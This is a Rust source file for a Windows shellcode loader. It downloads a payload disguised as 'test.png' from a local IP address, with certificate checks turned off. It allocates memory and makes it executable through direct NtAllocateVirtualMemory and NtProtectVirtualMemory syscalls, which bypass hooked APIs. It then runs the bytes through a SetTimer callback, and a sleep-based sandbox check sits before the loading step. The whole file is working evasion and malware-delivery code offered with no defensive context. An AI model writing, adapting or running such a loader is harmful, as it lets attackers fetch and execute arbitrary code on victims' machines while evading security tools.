extern crate winapi;

use winapi::um::processthreadsapi::GetCurrentProcess;

use std::thread::sleep;
use std::time::{
    Duration,
    Instant
};

use reqwest;
// https://github.com/janoglezcampos/rust_syscalls
use rust_syscalls::syscall;

use windows::Win32::UI::WindowsAndMessaging::{
    SetTimer,
    GetMessageW,
    DispatchMessageW,
    MSG
};

use windows::Win32::Foundation::{
    //HANDLE,
    HWND,
    //LPARAM,
    //BOOL
};

use std::ptr::null_mut;
use std::ffi::c_void;



fn countermeasures() {
    let now = Instant::now();
    sleep(Duration::from_secs(5));
    if now.elapsed().as_secs() < 5 {
        return;
    }
}

fn download_payload() -> Vec<u8> {                                                                                                 
    let url = "http://192.168.122.1/test.png";
    let client = reqwest::blocking::Client::builder()
        .danger_accept_invalid_certs(true)
        .build()
        .unwrap();
    let binary = client.get(url).send().unwrap().bytes().unwrap();
    binary.to_vec()
}


pub fn runner() {
    countermeasures();

    let shellcode = download_payload();

    unsafe {
        let mut allocstart : *mut c_void = null_mut();
        let mut size : usize = shellcode.len();

        let status = syscall!("NtAllocateVirtualMemory",
            GetCurrentProcess(),
            &mut allocstart,
            0,
            &mut size,
            0x3000,
            0x04
        );
        if status < 0 {
            return;
        }

        std::ptr::copy(shellcode.as_ptr() as _, allocstart, shellcode.len());

        let mut ppf = 0u32;
        let ppf_ptr = &mut ppf as *mut u32;
        let mut mem_ptr = allocstart as *const c_void;

        syscall!("NtProtectVirtualMemory",
            GetCurrentProcess(),
            &mut mem_ptr,
            &mut size,
            0x40,
            ppf_ptr
        );

        if status != 0 {
            return;
        }

        let exec: extern "system" fn(HWND, u32, usize, u32) = { std::mem::transmute(allocstart) };

        SetTimer(HWND(0), 0, 0, Some(exec));

        let mut msg: MSG = Default::default();
        let msgptr = &mut msg as *mut MSG;
        GetMessageW(msgptr , HWND(0), 0, 0);
        let msgptr = &msg as *const MSG;
        DispatchMessageW(msgptr);
    }
}
